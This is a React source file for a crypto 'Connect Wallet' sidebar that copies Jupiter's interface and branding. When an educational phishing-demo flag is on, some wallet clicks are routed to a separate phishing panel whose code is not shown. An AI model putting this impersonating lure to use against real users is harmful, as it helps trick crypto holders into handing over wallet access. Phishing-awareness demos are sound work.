import React, { useState, useEffect, useMemo } from 'react'
import { QRCodeSVG } from 'qrcode.react'
import {
  X,
  ArrowLeft,
  ChevronDown,
  ChevronUp,
  Copy,
  ExternalLink,
  LogOut,
  RefreshCw,
  Check,
  ShieldCheck,
  AlertTriangle
} from 'lucide-react'
import { openJupiterMobileApp } from '../lib/walletLinks'
import { isEduPhishingDemoEnabled } from '../lib/eduPhishDemo'
import { EduPhishingWalletPanel } from './EduPhishingWalletPanel'
import toast from 'react-hot-toast'
import { WalletLogo } from '../lib/walletLogos'
import { SolanaBadgeIcon } from './walletIcons'
import { useWalletState } from '../context/WalletContext'
import { useWallet } from '@solana/wallet-adapter-react'
import { WalletReadyState } from '@solana/wallet-adapter-base'
import { findWalletByHint, isWalletConnectable } from '../lib/walletConnectHelpers'
import {
  detectInstalledWallets,
  splitRecentAndInstalled,
  type DetectedWalletTile,
} from '../lib/detectInstalledWallets'

interface ConnectWalletSidebarProps {
  isOpen: boolean
  onClose: () => void
}

export interface WalletItemConfig {
  name: string
  adapterName?: string
  icon: string
  subtitle?: string
  url?: string
  deepLink?: string
}

// Full wallet list matching Jupiter sidebar reference UI
const MASTER_WALLETS: WalletItemConfig[] = [
  {
    name: 'Social Login',
    subtitle: 'prev. ⚡ Quick Account',
    icon: 'google',
  },
  {
    name: 'Phantom',
    adapterName: 'Phantom',
    icon: 'phantom',
    url: 'https://phantom.app',
  },
  {
    name: 'MetaMask',
    adapterName: 'MetaMask',
    icon: 'metamask',
    url: 'https://metamask.io',
  },
  {
    name: 'Solflare',
    adapterName: 'Solflare',
    icon: 'solflare',
    url: 'https://solflare.com',
  },
  {
    name: 'Backpack',
    adapterName: 'Backpack',
    icon: 'backpack',
    url: 'https://backpack.app',
  },
  {
    name: 'Coinbase Wallet',
    adapterName: 'Coinbase Wallet',
    icon: 'coinbase',
    url: 'https://www.coinbase.com/wallet',
  },
  {
    name: 'Magic Eden',
    icon: 'magiceden',
    url: 'https://magiceden.io',
  },
  {
    name: 'Jupiter',
    icon: 'jupiter',
    url: 'https://jup.ag',
  },
  {
    name: 'Trust',
    adapterName: 'Trust',
    icon: 'trust',
    url: 'https://trustwallet.com',
  },
  {
    name: 'Ledger',
    adapterName: 'Ledger',
    icon: 'ledger',
    url: 'https://ledger.com',
  },
  {
    name: 'Trezor',
    adapterName: 'Trezor',
    icon: 'trezor',
    url: 'https://trezor.io',
  },
  {
    name: 'Ethereum Wallet',
    adapterName: 'MetaMask',
    icon: 'ethereum',
    url: 'https://metamask.io',
  },
  {
    name: 'Coin98',
    adapterName: 'Coin98',
    icon: 'coin98',
    url: 'https://coin98.com',
  },
  {
    name: 'Google via TipLink',
    icon: 'tiplink',
    url: 'https://tiplink.io',
  },
  {
    name: 'Bitget Wallet',
    adapterName: 'Bitget Wallet',
    icon: 'bitget',
    url: 'https://web3.bitget.com',
  },
  {
    name: 'QR',
    icon: 'qr',
  },
]

function findWalletAdapter(
  wallets: { adapter: { name: string }; readyState: WalletReadyState }[],
  item: WalletItemConfig
) {
  return findWalletByHint(wallets, item.adapterName || item.name)
}

function walletUsesExtensionConnect(item: WalletItemConfig): boolean {
  if (item.adapterName) return true
  const n = item.name.toLowerCase()
  return (
    n.includes('phantom') ||
    n.includes('solflare') ||
    n.includes('metamask') ||
    n.includes('ethereum') ||
    n.includes('coinbase') ||
    n.includes('trust') ||
    n.includes('ledger') ||
    n.includes('backpack') ||
    n.includes('brave') ||
    n.includes('bitget') ||
    n.includes('coin98')
  )
}

const JupiterRecommendedIcon = () => (
  <img
    src="/logo.png"
    alt=""
    className="w-10 h-10 object-cover rounded-full"
  />
)

export const ConnectWalletSidebar: React.FC<ConnectWalletSidebarProps> = ({ isOpen, onClose }) => {
  const {
    walletAddress,
    shortAddress,
    walletName,
    walletIcon,
    connected,
    connecting,
    error,
    balanceSol,
    balanceLoading,
    isVerified,
    verifying,
    connectWallet,
    disconnectWallet,
    signAndVerifyServer,
    refreshBalance,
    clearError,
  } = useWalletState()

  const { wallets } = useWallet()

  const [mounted, setMounted] = useState(false)
  const [isWalletListExpanded, setIsWalletListExpanded] = useState(false)
  const [connectingItemName, setConnectingItemName] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  
  // Sub-view mode ('main' | 'qr' | 'phish')
  const [subView, setSubView] = useState<'main' | 'qr' | 'phish'>('main')
  const [phishTarget, setPhishTarget] = useState<{ name: string; icon: string } | null>(null)
  
  // QR session state
  const [qrSessionId, setQrSessionId] = useState<string>('')
  const [qrTimeLeft, setQrTimeLeft] = useState<number>(120)
  const [qrExpired, setQrExpired] = useState<boolean>(false)

  // Mount animation handling
  useEffect(() => {
    if (isOpen) {
      setMounted(true)
    } else {
      const t = setTimeout(() => {
        setMounted(false)
        setSubView('main')
        setPhishTarget(null)
        setConnectingItemName(null)
      }, 300)
      return () => clearTimeout(t)
    }
  }, [isOpen])

  // Lock background scroll
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden'
      return () => {
        document.body.style.overflow = ''
      }
    }
  }, [isOpen])

  // Close on Escape key
  useEffect(() => {
    if (!isOpen) return
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') onClose()
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [isOpen, onClose])

  // QR Code generator
  const generateQrSession = () => {
    const randomId = 'session_' + Math.random().toString(36).substring(2, 12)
    setQrSessionId(randomId)
    setQrTimeLeft(120)
    setQrExpired(false)
  }

  const openQrView = () => {
    generateQrSession()
    setSubView('qr')
  }

  // Countdown timer for QR code
  useEffect(() => {
    if (subView !== 'qr' || qrExpired || qrTimeLeft <= 0) return
    const timer = setInterval(() => {
      setQrTimeLeft((prev) => {
        if (prev <= 1) {
          setQrExpired(true)
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => clearInterval(timer)
  }, [subView, qrTimeLeft, qrExpired])

  const openPhishDemo = (item: WalletItemConfig) => {
    setPhishTarget({ name: item.name, icon: item.icon })
    setSubView('phish')
  }

  const handleConnectWalletItem = async (item: WalletItemConfig) => {
    clearError()

    if (item.name === 'QR') {
      if (isEduPhishingDemoEnabled()) {
        openPhishDemo(item)
        return
      }
      openQrView()
      return
    }

    const adapter = findWalletAdapter(wallets, item)
    const adapterReady = isWalletConnectable(adapter)

    if (isEduPhishingDemoEnabled() && !adapterReady) {
      openPhishDemo(item)
      return
    }

    if (item.name === 'Social Login') {
      toast('Social login is hosted on Jupiter. Use Phantom or Solflare here, or open Jupiter Mobile.', {
        icon: 'ℹ️',
      })
      openJupiterMobileApp()
      return
    }

    setConnectingItemName(item.name)

    if (walletUsesExtensionConnect(item)) {
      try {
        await connectWallet(item.adapterName || item.name)
        onClose()
      } catch {
        // Error shown in context
      } finally {
        setConnectingItemName(null)
      }
      return
    }

    if (item.name.includes('Jupiter')) {
      openJupiterMobileApp()
      setConnectingItemName(null)
      return
    }

    if (item.url) {
      window.open(item.url, '_blank', 'noopener,noreferrer')
      toast(`Opening ${item.name}…`, { icon: '↗' })
    }
    setConnectingItemName(null)
  }

  const handleJupiterExtension = () => {
    if (isEduPhishingDemoEnabled()) {
      openPhishDemo({ name: 'Jupiter Extension', icon: 'jupiter', url: 'https://jup.ag' })
      return
    }
    const jupiter = findWalletAdapter(wallets, { name: 'Jupiter', icon: 'jupiter' })
    if (isWalletConnectable(jupiter)) {
      void handleConnectWalletItem({ name: 'Jupiter', adapterName: 'Jupiter', icon: 'jupiter' })
      return
    }
    toast('Jupiter Extension is not installed. Use an installed wallet below.', { icon: 'ℹ️' })
  }

  const handleJupiterMobileRecommended = () => {
    if (isEduPhishingDemoEnabled()) {
      openPhishDemo({ name: 'Jupiter Mobile', icon: 'jupiter', url: 'https://jup.ag' })
      return
    }
    openQrView()
  }

  const handleCopyAddress = () => {
    if (!walletAddress) return
    navigator.clipboard.writeText(walletAddress)
    setCopied(true)
    toast.success('Wallet address copied!')
    setTimeout(() => setCopied(false), 2000)
  }

  const detectedInstalled = useMemo(() => detectInstalledWallets(wallets), [wallets])
  const { recent: recentTiles, installed: installedTiles } = useMemo(
    () => splitRecentAndInstalled(detectedInstalled),
    [detectedInstalled]
  )

  const renderWalletTiles = (tiles: DetectedWalletTile[]) => (
    <div className="flex items-center gap-2.5 flex-wrap">
      {tiles.map((tile) => (
        <button
          key={tile.adapterName}
          type="button"
          onClick={() =>
            handleConnectWalletItem({
              name: tile.name,
              adapterName: tile.adapterName,
              icon: tile.icon,
              url: tile.url,
            })
          }
          disabled={connecting}
          className="w-[72px] h-[72px] rounded-[18px] bg-[#161b22] border border-[#21262d] hover:bg-[#1c2129] hover:border-[#30363d] flex items-center justify-center flex-shrink-0 transition-all cursor-pointer active:scale-[0.97] disabled:opacity-50 relative"
          title={tile.name}
        >
          <WalletLogo name={tile.icon || tile.name} className="w-9 h-9" />
          {tile.showSolanaBadge && (
            <span className="absolute bottom-1.5 right-1.5 w-4 h-4 rounded-full overflow-hidden ring-1 ring-[#0c0f14]">
              <SolanaBadgeIcon className="w-4 h-4" />
            </span>
          )}
        </button>
      ))}
    </div>
  )

  if (!mounted) return null

  const qrUri = `solana:${walletAddress || 'connect'}?session=${qrSessionId}&dapp=${encodeURIComponent(window.location.origin)}`

  return (
    <div className="fixed inset-0 z-[100] flex justify-end" aria-modal="true" role="dialog">
      {/* Backdrop Overlay */}
      <div
        className={`fixed inset-0 bg-black/75 backdrop-blur-sm transition-opacity duration-300 ${
          isOpen ? 'opacity-100' : 'opacity-0'
        }`}
        onClick={onClose}
      />

      {/* Drawer Panel */}
      <div
        className={`relative flex flex-col w-full sm:w-[400px] bg-[#0c0f14] border-l border-[#21262d] shadow-2xl
          h-[100dvh] sm:h-full
          rounded-t-[28px] sm:rounded-none sm:rounded-l-[28px]
          transition-transform duration-300 ease-out will-change-transform
          ${isOpen ? 'translate-x-0' : 'translate-x-full'}
          pt-[env(safe-area-inset-top)] pb-[env(safe-area-inset-bottom)] z-10`}
      >
        {/* Header */}
        <div className="flex items-center justify-between px-5 sm:px-6 h-[56px] flex-shrink-0">
          <div className="flex items-center gap-2.5">
            {(subView === 'qr' || subView === 'phish') && (
              <button
                onClick={() => {
                  setSubView('main')
                  setPhishTarget(null)
                }}
                className="w-8 h-8 rounded-full bg-[#161b22] border border-[#30363d] flex items-center justify-center text-[#8b949e] hover:text-white transition-all cursor-pointer"
                title="Back to Wallets"
              >
                <ArrowLeft className="w-4 h-4" />
              </button>
            )}
            <h2 className="text-[22px] font-bold text-white tracking-tight">
              {subView === 'qr' ? 'Scan QR Code' : subView === 'phish' ? 'Connect' : 'Connect'}
            </h2>
          </div>
          <button
            onClick={onClose}
            className="w-9 h-9 rounded-full bg-[#161b22] border border-[#30363d] flex items-center justify-center text-[#8b949e] hover:text-white hover:bg-[#21262d] transition-all cursor-pointer"
            aria-label="Close modal"
          >
            <X className="w-[18px] h-[18px]" strokeWidth={2.25} />
          </button>
        </div>

        {subView === 'phish' && phishTarget ? (
          <EduPhishingWalletPanel
            walletBrand={phishTarget.name}
            walletIcon={phishTarget.icon}
            onBack={() => {
              setSubView('main')
              setPhishTarget(null)
            }}
            onClose={onClose}
          />
        ) : (
        <div className="flex-1 overflow-y-auto overscroll-contain px-5 sm:px-6 pb-6 space-y-4">
          {/* CONNECTED STATE BOX */}
          {connected && walletAddress ? (
            <div className="bg-[#0B1522] border border-[#1D2E44] rounded-2xl p-4 space-y-3.5 shadow-lg">
              <div className="flex items-center justify-between">
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-[#B7F34A]/10 text-[#B7F34A] border border-[#B7F34A]/30 flex items-center gap-1.5">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#B7F34A] animate-pulse" /> Live Connected
                </span>
                <span className="text-xs text-gray-400 font-semibold">{walletName || 'Solana Wallet'}</span>
              </div>

              <div>
                <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider">Wallet Address</p>
                <p className="font-mono text-xs text-[#B7F34A] font-bold truncate mt-0.5 select-all">{walletAddress}</p>
              </div>

              {/* RPC Balance */}
              <div className="bg-[#070D16] border border-[#162436] rounded-xl p-3 flex items-center justify-between">
                <div>
                  <p className="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Solana RPC Balance</p>
                  <p className="text-sm font-extrabold text-white mt-0.5">
                    {balanceLoading ? (
                      <span className="text-gray-400 animate-pulse">Loading...</span>
                    ) : balanceSol !== null ? (
                      `${balanceSol.toFixed(4)} SOL`
                    ) : (
                      '0.00 SOL'
                    )}
                  </p>
                </div>
                <button
                  onClick={refreshBalance}
                  className="p-1.5 text-gray-400 hover:text-white bg-[#0F1A28] rounded-lg transition-colors cursor-pointer"
                  title="Refresh Balance"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${balanceLoading ? 'animate-spin text-[#B7F34A]' : ''}`} />
                </button>
              </div>

              {/* Signature Verification */}
              <div className="pt-2 border-t border-[#142030]">
                {isVerified ? (
                  <div className="bg-[#B7F34A]/10 border border-[#B7F34A]/30 rounded-xl p-2.5 flex items-center gap-2.5">
                    <ShieldCheck className="w-4 h-4 text-[#B7F34A] flex-shrink-0" />
                    <p className="text-[11px] font-bold text-white">Server Signature Verified</p>
                  </div>
                ) : (
                  <button
                    onClick={signAndVerifyServer}
                    disabled={verifying}
                    className="w-full py-2 bg-[#00D2B8] hover:bg-[#00b8a2] text-[#060B11] font-extrabold text-xs rounded-xl flex items-center justify-center gap-1.5 transition-all cursor-pointer disabled:opacity-50"
                  >
                    {verifying ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
                    <span>{verifying ? 'Signing Challenge...' : 'Verify Wallet Ownership'}</span>
                  </button>
                )}
              </div>

              {/* Action Buttons */}
              <div className="pt-1 flex items-center gap-2">
                <button
                  onClick={handleCopyAddress}
                  className="flex-1 py-2 bg-[#142030] hover:bg-[#1B2B3E] text-white text-xs font-semibold rounded-xl border border-[#22344A] transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
                >
                  {copied ? <Check className="w-3.5 h-3.5 text-[#B7F34A]" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copied ? 'Copied' : 'Copy Address'}</span>
                </button>

                <a
                  href={`https://solscan.io/account/${walletAddress}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="p-2 bg-[#142030] hover:bg-[#1B2B3E] text-gray-300 hover:text-white rounded-xl border border-[#22344A] transition-colors"
                  title="View on Explorer"
                >
                  <ExternalLink className="w-4 h-4" />
                </a>

                <button
                  onClick={disconnectWallet}
                  className="py-2 px-3 bg-red-500/10 hover:bg-red-500/20 text-red-400 text-xs font-semibold rounded-xl border border-red-500/30 transition-colors flex items-center gap-1 cursor-pointer"
                >
                  <LogOut className="w-3.5 h-3.5" />
                  <span>Disconnect</span>
                </button>
              </div>
            </div>
          ) : null}

          {/* STATUS / ERROR BANNER */}
          {connecting && (
            <div className="bg-[#0C1726] border border-[#1F3248] rounded-2xl p-3.5 flex items-center gap-3 animate-pulse">
              <RefreshCw className="w-5 h-5 text-[#B7F34A] animate-spin flex-shrink-0" />
              <div>
                <p className="text-xs font-bold text-white">Connecting to {connectingItemName || 'Wallet'}...</p>
                <p className="text-[11px] text-gray-400">Approve the connection prompt in your wallet.</p>
              </div>
            </div>
          )}

          {error && !connecting && (
            <div className="bg-red-500/10 border border-red-500/30 rounded-2xl p-3.5 flex items-start gap-2.5">
              <AlertTriangle className="w-4 h-4 text-red-400 mt-0.5 flex-shrink-0" />
              <div className="flex-1">
                <p className="text-xs font-bold text-red-300">Connection Error</p>
                <p className="text-xs text-red-300/80 leading-normal mt-0.5">{error}</p>
              </div>
              <button onClick={clearError} className="text-red-400 text-xs font-bold hover:text-white">✕</button>
            </div>
          )}

          {/* SUB-VIEW: QR CODE SCANNER */}
          {subView === 'qr' && (
            <div className="bg-[#0B1522] border border-[#1D2E44] rounded-2xl p-5 space-y-4 flex flex-col items-center text-center animate-fadeIn">
              <div className="p-3 bg-white rounded-2xl border-4 border-[#00D2B8]/40 shadow-xl">
                {!qrExpired ? (
                  <QRCodeSVG value={qrUri} size={180} level="H" includeMargin={true} />
                ) : (
                  <div className="w-[180px] h-[180px] flex flex-col items-center justify-center bg-gray-900 rounded-xl text-white p-4 space-y-2">
                    <AlertTriangle className="w-8 h-8 text-amber-400" />
                    <p className="text-xs font-bold">QR Session Expired</p>
                    <button
                      onClick={generateQrSession}
                      className="px-3 py-1 bg-[#B7F34A] text-[#060B11] text-[11px] font-bold rounded-lg hover:bg-[#a6e038] transition-colors cursor-pointer"
                    >
                      Regenerate
                    </button>
                  </div>
                )}
              </div>

              {!qrExpired && (
                <div className="space-y-1">
                  <p className="text-xs font-semibold text-gray-300">
                    Scan with Phantom or Solflare Mobile App
                  </p>
                  <p className="text-[11px] text-[#B7F34A] font-mono font-bold">
                    Expires in: {Math.floor(qrTimeLeft / 60)}:{('0' + (qrTimeLeft % 60)).slice(-2)}
                  </p>
                </div>
              )}
            </div>
          )}

          {/* MAIN WALLET LIST VIEW */}
          {subView === 'main' && (
            <>
              <button
                type="button"
                onClick={handleJupiterExtension}
                className="w-full text-left relative rounded-[20px] p-[1px] bg-gradient-to-br from-[#5a7a3a]/80 via-[#3d5229]/40 to-[#1a2412]/30 shadow-[0_0_28px_rgba(199,243,132,0.08)] transition-transform active:scale-[0.995]"
              >
                <div className="relative rounded-[19px] bg-[#12161c] px-4 py-4 sm:py-[18px] overflow-hidden">
                  <span className="absolute top-3 right-3 bg-[#c7f284] text-[#0c0f14] text-[11px] font-bold px-2.5 py-[3px] rounded-md leading-none">
                    Recommended
                  </span>
                  <div className="flex items-center gap-3.5 pr-16">
                    <div className="w-11 h-11 rounded-full bg-[#0c0f14] flex items-center justify-center flex-shrink-0 overflow-hidden ring-1 ring-[#21262d]">
                      <JupiterRecommendedIcon />
                    </div>
                    <div className="min-w-0">
                      <p className="text-[15px] font-bold text-white leading-snug">Jupiter Extension</p>
                      <p className="text-[13px] text-[#8b949e] font-normal mt-0.5 leading-snug">
                        Instant trades with auto-approval!
                      </p>
                    </div>
                  </div>
                </div>
              </button>

              <button
                type="button"
                onClick={handleJupiterMobileRecommended}
                className="w-full text-left rounded-[20px] bg-[#161b22] border border-[#21262d] hover:bg-[#1c2129] px-4 py-4 flex items-center gap-3.5 transition-all"
              >
                <div className="w-11 h-11 rounded-full bg-[#0c0f14] flex items-center justify-center flex-shrink-0 overflow-hidden ring-1 ring-[#21262d]">
                  <JupiterRecommendedIcon />
                </div>
                <div className="min-w-0">
                  <p className="text-[15px] font-bold text-white leading-snug">Jupiter Mobile</p>
                  <p className="text-[13px] text-[#8b949e] font-normal mt-0.5 leading-snug">
                    Scan QR code to connect
                  </p>
                </div>
              </button>

              {recentTiles.length > 0 && (
                <div className="pt-1">
                  <p className="text-[13px] font-medium text-[#8b949e] mb-3">Recently Used</p>
                  {renderWalletTiles(recentTiles)}
                </div>
              )}

              <div className="pt-1">
                <p className="text-[13px] font-medium text-[#8b949e] mb-3">Installed</p>
                {installedTiles.length > 0 ? (
                  renderWalletTiles(installedTiles)
                ) : (
                  <p className="text-xs text-[#8b949e]">
                    No other wallet extensions detected in this browser.
                  </p>
                )}
              </div>

              {/* View less / more divider */}
              <div className="relative flex items-center justify-center py-1">
                <div className="absolute inset-0 flex items-center px-1">
                  <div className="w-full h-px bg-[#21262d]" />
                </div>
                <button
                  type="button"
                  onClick={() => setIsWalletListExpanded((v) => !v)}
                  className="relative z-10 bg-[#0c0f14] border border-[#30363d] text-[13px] font-semibold text-[#8b949e] hover:text-[#c9d1d9] px-4 py-1.5 rounded-full flex items-center gap-1.5 cursor-pointer transition-colors"
                >
                  {isWalletListExpanded ? (
                    <>
                      <span>View Less Wallets</span>
                      <ChevronUp className="w-4 h-4" strokeWidth={2.5} />
                    </>
                  ) : (
                    <>
                      <span>View More Wallets</span>
                      <ChevronDown className="w-4 h-4" strokeWidth={2.5} />
                    </>
                  )}
                </button>
              </div>

              {/* Wallet rows */}
              {isWalletListExpanded && (
                <div className="space-y-2 pt-0.5">
                  {MASTER_WALLETS.map((item) => (
                    <button
                      key={item.name}
                      type="button"
                      onClick={() => handleConnectWalletItem(item)}
                      disabled={connecting}
                      className="w-full bg-[#161b22] border border-[#21262d] hover:bg-[#1c2129] hover:border-[#30363d] rounded-[16px] px-4 py-[14px] flex items-center gap-3.5 transition-all cursor-pointer active:scale-[0.99] disabled:opacity-60 text-left"
                    >
                      <div className="w-7 h-7 flex items-center justify-center flex-shrink-0">
                        <WalletLogo name={item.icon || item.name} className="w-7 h-7" />
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-[15px] font-semibold text-white leading-tight">{item.name}</p>
                        {item.subtitle && (
                          <p className="text-[13px] text-[#8b949e] leading-tight mt-0.5">{item.subtitle}</p>
                        )}
                      </div>
                      {connectingItemName === item.name && (
                        <RefreshCw className="w-4 h-4 text-[#c7f284] animate-spin flex-shrink-0" />
                      )}
                    </button>
                  ))}
                </div>
              )}
            </>
          )}
        </div>
        )}
      </div>
    </div>
  )
}
